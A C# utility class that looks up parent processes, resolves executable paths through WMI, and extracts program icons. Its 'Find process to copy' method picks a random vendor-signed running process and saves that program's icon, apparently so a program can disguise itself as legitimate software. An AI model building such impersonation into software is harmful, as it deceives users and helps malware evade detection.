using System.IO;
using System.Drawing;
using System.Management;
using System.Diagnostics;
using System.Collections.Generic;

namespace Application.Watcher
{
    internal sealed class ProcessUtils
    {
        public static readonly Process CurrentProcess = Process.GetCurrentProcess();

        private static string FindIndexedProcessName(int pid)
        {
            var processName = Process.GetProcessById(pid).ProcessName;
            var processesByName = Process.GetProcessesByName(processName);
            string processIndexdName = null;

            for (var index = 0; index < processesByName.Length; index++)
            {
                processIndexdName = index == 0 ? processName : processName + "#" + index;
                var processId = new PerformanceCounter("Process", "ID Process", processIndexdName);
                if ((int)processId.NextValue() == pid)
                {
                    return processIndexdName;
                }
            }
            return processIndexdName;
        }

        private static Process FindPidFromIndexedProcessName(string indexedProcessName)
        {
            var parentId = new PerformanceCounter("Process", "Creating Process ID", indexedProcessName);
            return Process.GetProcessById((int)parentId.NextValue());
        }

        /// <summary>
        /// Find parent process
        /// </summary>
        /// <param name="process">Process object</param>
        /// <returns>Process object</returns>
        public static Process GetParent(Process process)
        {
            return FindPidFromIndexedProcessName(FindIndexedProcessName(process.Id));
        }

        /// <summary>
        /// Find process to copy
        /// </summary>
        public static Process GrabRandomProcess()
        {
            List<Process> possible = new List<Process>();
            foreach (Process process in Process.GetProcesses(System.Environment.MachineName))
            {
                try {
                    if (CurrentProcess.Id != process.Id
                        && !string.IsNullOrEmpty(process.MainModule.FileVersionInfo.CompanyName)
                        && !string.IsNullOrEmpty(ProcessUtils.ProcessExecutablePath(process))
                    ) possible.Add(process);
                } catch (System.ComponentModel.Win32Exception) { continue; }
            }
            // If process count is 0
            if (possible.Count == 0)
                return null;
            // Return random process
            return possible[new System.Random().Next(0, possible.Count)];
        }

        /// <summary>
        /// Get process icon
        /// </summary>
        /// <param name="process">Process object</param>
        /// <returns>Bitmap</returns>
        public static string GrabIcon(Process process)
        {
            string ico = Path.Combine(Path.GetTempPath(), process.ProcessName + ".ico");
            string exe = ProcessExecutablePath(process);

            using (Stream stream = File.OpenWrite(ico))
            {
                Icon.ExtractAssociatedIcon(exe)
                    .Save(stream);
            }
            return ico;
        }

        /// <summary>
        /// Get process executable location on disk
        /// </summary>
        /// <param name="process">Process object</param>
        /// <returns>executable path</returns>
        public static string ProcessExecutablePath(Process process)
        {
            try {
                return process.MainModule.FileName;
            } catch {
                string query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

                foreach (ManagementObject item in searcher.Get())
                {
                    object id = item["ProcessID"];
                    object path = item["ExecutablePath"];

                    if (path != null && id.ToString() == process.Id.ToString())
                    {
                        return path.ToString();
                    }
                }
            }
            return "";
        }

    }
}
